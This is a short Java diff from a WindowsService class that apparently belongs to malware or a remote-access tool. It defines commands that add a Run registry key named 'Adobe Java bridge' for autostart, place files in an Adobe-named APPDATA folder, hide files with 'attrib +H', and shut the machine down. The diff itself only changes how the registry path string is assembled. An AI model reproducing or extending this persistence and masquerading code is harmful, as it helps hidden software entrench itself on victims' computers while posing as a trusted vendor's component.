@@ -8,7 +8,7 @@ public final class WindowsService implements IOperatingSystemService {
 	
 	private static final String SHUTDOWN_COMMAND = "shutdown -s -t 0";
 	private static final String STARTUP_DIRECTORY_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR";
-	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"%s\"";
+	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD \"HKCU" + File.separator + "SOFTWARE" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run\" /v \"Adobe Java bridge\" /d \"%s\"";
 	private static final String HIDE_FILE_COMMAND = "attrib +H %s";
 	
 	WindowsService() {
